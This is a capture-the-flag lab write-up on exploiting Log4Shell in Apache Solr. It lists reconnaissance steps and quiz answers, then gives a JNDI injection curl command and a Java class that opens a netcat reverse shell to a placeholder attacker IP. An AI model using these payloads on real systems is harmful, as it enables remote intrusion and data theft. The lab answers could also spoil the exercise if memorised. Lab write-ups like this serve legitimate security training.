# Log-4j-Solar-Writeup

## Task 1: Introduction

#### Log4j (Log4Shell) is a bug in a logging tool used in many apps.If a hacker sends a special message, the system may run their code by mistake.This lets the hacker control the system without logging in.

## Task 2: Reconnaissance

### What service is running on port 8983? (Just the name of the software)

By using Command :

###  nmap -Sv -p- 8983 10.48.130.26
We can able to find the Version of the port number 8983.
<img width="959" height="527" alt="image" src="https://github.com/user-attachments/assets/bda1411f-d238-40c0-ad71-28687a404fba" />

Correct Answer: Apache Solr

## Task 3: Discovery

#### 1.Take a close look at the first page visible when navigating to http://10.48.130.26:8983 (opens in new tab). You should be able to see clear indicators that log4j is in use within the application for logging activity. What is the -Dsolr.log.dir argument set to, displayed on the front page?

<img width="958" height="528" alt="image" src="https://github.com/user-attachments/assets/d12fa9fd-12f3-4f27-a0af-fae2cc33f80c" />

Correct Answer: /var/solr/logs

#### 2.One file has a significant number of INFO entries showing repeated requests to one specific URL endpoint. Which file includes contains this repeated entry? (Just the filename itself, no path needed)

Correct answer: Solr.log

<img width="959" height="492" alt="image" src="https://github.com/user-attachments/assets/f29ee9b1-be26-438e-9477-019257b40519" />

The info has present in solr.log1,log2 files they asked the filename and it is Solr.log.

#### 3.What "path" or URL endpoint is indicated in these repeated entries?

Correct Answer: /admin/cores
#### 4.Viewing these log entries, what field name indicates some data entrypoint that you as a user could control? (Just the field name)

Correct Answer:params

<img width="946" height="526" alt="image" src="https://github.com/user-attachments/assets/4cebec2c-025f-4329-a162-de252040c4c1" />

### Task 4: Proof Of Concept
Here we are Connecting  nc -lnvp 9999  netcat to connect the  website  curl 'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:9999\}'   In this we change into attacker's op address to inject the vulnerablility malicious java code due to the use of the $ dollar-sign character in your syntax, you must ensure you wrap the URL within single-quotes so bash (your command-line shell) does not interpret it as a variable. And the connection received to the netcat port.

<img width="959" height="536" alt="image" src="https://github.com/user-attachments/assets/00734076-2865-4cf5-ad43-e4dd952c7e93" />


<img width="1919" height="933" alt="Screenshot 2026-03-22 140116" src="https://github.com/user-attachments/assets/9a73f039-f1b2-4f96-a2ad-8c494142741c" />

## Task 5: Exploitation

<img width="1919" height="1065" alt="Screenshot 2026-03-22 184129" src="https://github.com/user-attachments/assets/5851f4d1-0395-470e-a363-47a134eafdf1" />

<img width="1919" height="1045" alt="Screenshot 2026-03-22 184138" src="https://github.com/user-attachments/assets/97d43584-54da-47f8-981d-0a07cf0a9770" />

In this Log4j vulnerability lets attackers run code using a special text input. The attacker sends a string like ${jndi:ldap://...} to the target.The target connects to the attacker’s server and it listen to the port Listening on 0.0.0.0:1389  and That file runs on the target and we can get the acces and we can steal data or any information. This command starts a fake LDAP server and it is used to trick the victim into the malicious file that we code.

### public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}


## Task 6: Persistence
























